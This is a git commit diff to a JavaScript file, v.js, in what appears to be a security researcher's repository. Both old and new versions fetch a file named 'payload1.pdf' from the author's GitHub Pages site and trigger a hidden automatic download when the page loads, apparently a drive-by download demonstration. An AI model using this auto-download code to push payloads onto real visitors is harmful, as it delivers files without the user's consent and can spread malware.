0f7e479b0d064988e6b60bfb2b9c9fa5ab534c3d
aillesiM <29269177+ener1-s3c@users.noreply.github.com>
2024-08-25 13:22:56 +0700

    update(again)

--- v.js
+++ v.js
@@ -1,11 +1,18 @@
-fetch("https://raw.githubusercontent.com/ener1-s3c/ener1-s3c.github.io/master/payload1.pdf")
-  .then(response => response.blob())
-  .then(blob => {
-    var link = document.createElement("a");
-    link.href = window.URL.createObjectURL(blob);
-    link.download = "payload1.pdf";
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-  })
-  .catch(console.error);
+function downloadFile(url, filename) {
+    fetch(url)
+      .then(response => response.blob())
+      .then(blob => {
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.style.display = "none";
+        a.href = url;
+        a.download = filename;
+        document.body.appendChild(a);
+        a.click();
+        window.URL.revokeObjectURL(url);
+      })
+      .catch(() => alert("Failed to download file"));
+}
+
+// Automatically start the download
+downloadFile("https://raw.githubusercontent.com/ener1-s3c/ener1-s3c.github.io/master/payload1.pdf", "payload1.pdf");
